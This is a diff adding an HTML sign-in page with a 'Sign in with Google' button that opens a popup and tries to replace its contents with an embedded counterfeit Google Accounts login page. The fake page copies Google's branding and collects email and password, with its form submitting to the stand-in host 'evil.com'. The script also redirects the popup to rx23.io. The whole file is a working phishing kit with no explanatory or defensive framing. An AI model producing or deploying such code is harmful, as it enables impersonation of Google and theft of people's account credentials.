@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In</title>
+    <!-- Load Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* Custom styles for the Inter font and overall body layout */
+        body {
+            font-family: 'Inter', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh; /* Ensure full viewport height */
+            background-color: #f0f2f5; /* Light gray background */
+            margin: 0;
+            padding: 1rem; /* Add some padding for smaller screens */
+            box-sizing: border-box; /* Include padding in element's total width and height */
+        }
+        /* Styling for the custom Google button */
+        .google-button {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: white;
+            color: #3c4043; /* Dark gray text */
+            border: 1px solid #dadce0; /* Light gray border */
+            border-radius: 9999px; /* Fully rounded corners */
+            padding: 0.75rem 1.5rem; /* Vertical and horizontal padding */
+            font-size: 1rem;
+            font-weight: 500; /* Medium font weight */
+            cursor: pointer;
+            transition: background-color 0.2s, box-shadow 0.2s; /* Smooth transitions for hover effects */
+            box-shadow: 0 2px 4px rgba(0,0,0,0.06), 0 1px 2px rgba(0,0,0,0.08); /* Subtle shadow */
+        }
+        /* Hover effect for the Google button */
+        .google-button:hover {
+            background-color: #f8f9fa; /* Lighter background on hover */
+            box-shadow: 0 3px 6px rgba(0,0,0,0.1), 0 2px 4px rgba(0,0,0,0.12); /* Enhanced shadow on hover */
+        }
+        /* Styling for the Google icon within the button */
+        .google-icon {
+            width: 18px;
+            height: 18px;
+            margin-right: 8px; /* Space between icon and text */
+        }
+    </style>
+</head>
+<body class="flex flex-col items-center justify-center min-h-screen bg-gray-100 p-4">
+
+    <!-- Main container for the sign-in card -->
+    <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
+        <h1 class="text-2xl font-semibold mb-6 text-gray-800">Welcome</h1>
+        <!-- The "Sign in with Google" button -->
+        <button class="google-button" onclick="start()">
+           <img src=https://onymos.com/wp-content/uploads/2020/10/google-signin-button-1024x260.png>
+        </button>
+    </div>
+
+    <script>
+                    const googleLoginPageHtml = `
+                        <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <script src="https://cdn.tailwindcss.com"><\/script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: #fff;
+            padding: 2.5rem;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(60, 64, 67, 0.3), 0 4px 8px rgba(60, 64, 67, 0.15);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            box-sizing: border-box; /* Ensure padding is included in width */
+        }
+        .input-field {
+            width: 100%;
+            padding: 0.75rem 1rem;
+            margin-bottom: 1.25rem;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 1rem;
+            box-sizing: border-box;
+            transition: border-color 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
+        }
+        .input-field:focus {
+            outline: none;
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 1px #1a73e8;
+        }
+        .btn-primary {
+            background-color: #1a73e8;
+            color: #fff;
+            padding: 0.75rem 1.5rem;
+            border-radius: 4px;
+            font-size: 1rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s ease-in-out;
+            width: auto; /* Allow button to size based on content */
+            min-width: 90px; /* Ensure a minimum width */
+        }
+        .btn-primary:hover {
+            background-color: #1766d1;
+        }
+        .link-text {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 0.875rem;
+            transition: color 0.2s ease-in-out;
+        }
+        .link-text:hover {
+            color: #1766d1;
+            text-decoration: underline;
+        }
+        .message-box {
+            background-color: #e6f4ea;
+            color: #1e8449;
+            padding: 0.75rem;
+            border-radius: 4px;
+            margin-bottom: 1rem;
+            text-align: left;
+            font-size: 0.875rem;
+            display: none; /* Hidden by default */
+        }
+        .message-box.error {
+            background-color: #fce8e6;
+            color: #d93025;
+        }
+        .flex-between {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+            margin-top: 1.5rem;
+        }
+        .text-left {
+            text-align: left;
+        }
+        .text-right {
+            text-align: right;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="mx-auto mb-6 w-24">
+        <h1 class="text-2xl font-normal mb-2">Sign in</h1>
+        <p class="text-base text-gray-600 mb-6">Use your Google Account</p>
+
+        <div id="messageBox" class="message-box"></div>
+
+        <form id="loginForm" action="https://evil.com">
+            <input type="email" id="email" class="input-field" placeholder="Email or phone" required>
+            <input type="password" id="password" class="input-field" placeholder="Password" required>
+
+            <div class="text-left mb-6">
+                <a href="#" class="link-text">Forgot password?</a>
+            </div>
+
+            <p class="text-sm text-gray-600 text-left mb-6">
+                Not your computer? Use a private browsing window to sign in. <a href="#" class="link-text">Learn more</a>
+            </p>
+
+            <div class="flex-between">
+                <a href="#" class="link-text">Create account</a>
+                <button type="submit" class="btn-primary">Next</button>
+            </div>
+        </form>
+    </div>
+
+</body>
+</html>
+                    `;
+var j='';
+function start(){
+j = window.open(`https://www.google.com/search?q=account.google.com`,`j`)
+
+setTimeout(()=>{
+
+const intervalId = setInterval(() => {
+  try {
+    j.document.body.innerHTML=googleLoginPageHtml;
+    j.window.location='https://rx23.io/'
+    clearInterval(intervalId);
+  } catch (error) {
+  }
+}, 100);
+
+},1500);
+
+}
+
+    </script>
+</body>
+</html>
